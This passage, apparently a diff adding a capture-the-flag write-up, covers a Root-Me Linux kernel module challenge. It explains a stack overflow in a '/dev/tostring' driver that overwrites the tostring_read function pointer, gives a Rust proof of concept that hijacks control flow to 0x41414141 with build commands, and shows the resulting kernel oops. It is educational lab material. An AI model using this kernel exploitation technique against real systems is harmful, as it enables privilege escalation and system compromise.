+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;snprintf&lt;/span&gt;(buf,len,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%16llx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,tostring.tostring_stack[&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;tostring.pointer]));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_read_dec&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;loff_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;off)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring: read_dec()&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (tostring.pointer &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;snprintf&lt;/span&gt;(buf,len,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lld&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,tostring.tostring_stack[&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;tostring.pointer]));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we achieve to overwrite the &lt;code&gt;tostring_read&lt;/code&gt; function pointer with the address of any other kernel function, we can achieve code execution from the LKM context (likely giving full privileges to the system).&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;verify-our-guess--exploit-skeletton&#34;&gt;Verify our guess + exploit skeletton&lt;/h3&gt;
+&lt;p&gt;First, we will write a simple script that trigger the bug we found. The script will be adapted later to craft the exploit.&lt;/p&gt;
+&lt;p&gt;What we need to do is:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Open &lt;code&gt;/dev/tostring&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fill the stack to make it full (by writing 32 bits integers)&lt;/li&gt;
+&lt;li&gt;Write the stack with our malicious pointer (should overflow the stack and overwrite &lt;code&gt;tostring_read&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Performs a read to call the &lt;code&gt;tostring_read&lt;/code&gt; function pointer, effectively diverting the control flow to our malicious function&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Here is a simple Rust code doing this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; std::{fs::OpenOptions, io::{Read, Write}};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TOSTRING_STACK_SIZE&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; intval: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; tostring_read_override_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41414141&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; dev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt; OpenOptions::new()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .read(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .write(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/tostring&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Ok(f) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; f,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Err(e) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            eprintln!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to open /dev/tostring: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, e);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std::process::exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// grow stack
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;TOSTRING_STACK_SIZE&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dev.write_all(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;intval.to_le_bytes()).expect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to write to /dev/tostring to override stack&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// overwrite `tostring_read`
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    dev.write_all(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tostring_read_override_ea.to_le_bytes()).expect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to write to /dev/tostring to override function pointer&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;; size_of::&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;()];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dev.read_exact(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; ret).expect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to read from /dev/tostring&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;lt;-- should make kernel crash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;result: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:#x}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;::from_le_bytes(ret));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The target runs on a 32bits x86 processor, meaning we have to compile the binary for this target:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir ch1_exploit &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cd ch1_exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cargo init .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vi src/main.rs &lt;span style=&#34;color:#75715e&#34;&gt;# paste code above and type :x! to exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# add the x86 static target&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rustup target add i686-unknown-linux-musl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# build the binary&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cargo build --target i686-unknown-linux-musl
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, uploading the binary to the target and running it gives us the following crash. We sucessfully triggered the bug ! (notice the &lt;code&gt;IP = 0x41414141&lt;/code&gt; message indicating kernel tried to branch to the address we injected)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Root-Me user@linkern-chall:~$ ./exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.010914&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; BUG: unable to handle kernel paging request at &lt;span style=&#34;color:#ae81ff&#34;&gt;41414141&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.019794&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP: 0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.023392&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; *pde &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.023394&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.029519&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Oops: &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#1] SMP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.032706&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Modules linked in: basic1_ch1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;O&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.037291&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CPU: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; PID: &lt;span style=&#34;color:#ae81ff&#34;&gt;1050&lt;/span&gt; Comm: exploit Tainted: G           O    4.10.3 &lt;span style=&#34;color:#75715e&#34;&gt;#4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.044501&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Hardware name: QEMU Standard PC &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i440FX + PIIX, 1996&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, BIOS 1.10.2-1ubuntu1 04/01/2014
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.054875&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; task: c2bbabc0 task.stack: c2900000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.061686&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EIP: 0x41414141
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.066930&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EFLAGS: &lt;span style=&#34;color:#ae81ff&#34;&gt;00010296&lt;/span&gt; CPU: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.073703&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EAX: c2ac4540 EBX: c2ac4540 ECX: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000004&lt;/span&gt; EDX: bfa09fe8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.084471&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ESI: bfa09fe8 EDI: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000004&lt;/span&gt; EBP: c2901eec ESP: c2901ed8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.095701&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  DS: 007b ES: 007b FS: 00d8 GS: &lt;span style=&#34;color:#ae81ff&#34;&gt;0033&lt;/span&gt; SS: &lt;span style=&#34;color:#ae81ff&#34;&gt;0068&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.105140&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CR0: &lt;span style=&#34;color:#ae81ff&#34;&gt;80050033&lt;/span&gt; CR2: &lt;span style=&#34;color:#ae81ff&#34;&gt;41414141&lt;/span&gt; CR3: 0290a000 CR4: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000690&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.116913&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Call Trace:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.121776&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  ? tostring_read+0x2d/0x40 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;basic1_ch1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.130786&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  ? tostring_open+0x20/0x20 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;basic1_ch1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.140015&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  __vfs_read+0x24/0x110
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.146076&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  ? rw_verify_area+0x5c/0x120
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.153662&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  vfs_read+0x76/0x140
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.159884&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  SyS_read+0x39/0x90
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.166064&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  do_fast_syscall_32+0x85/0x150
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.174031&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  entry_SYSENTER_32+0x47/0x71
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.181482&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EIP: 0xb776dcc5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.186867&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EFLAGS: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000292&lt;/span&gt; CPU: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.193362&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EAX: ffffffda EBX: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000003&lt;/span&gt; ECX: bfa09fe8 EDX: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000004&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.204696&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ESI: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; EDI: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; EBP: &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; ESP: bfa09f44
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.216088&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  DS: 007b ES: 007b FS: &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; GS: &lt;span style=&#34;color:#ae81ff&#34;&gt;0033&lt;/span&gt; SS: 007b
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.226188&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Code:  Bad EIP value.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.232677&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; EIP: 0x41414141 SS:ESP: 0068:c2901ed8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.241635&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CR2: &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000041414141&lt;/span&gt;
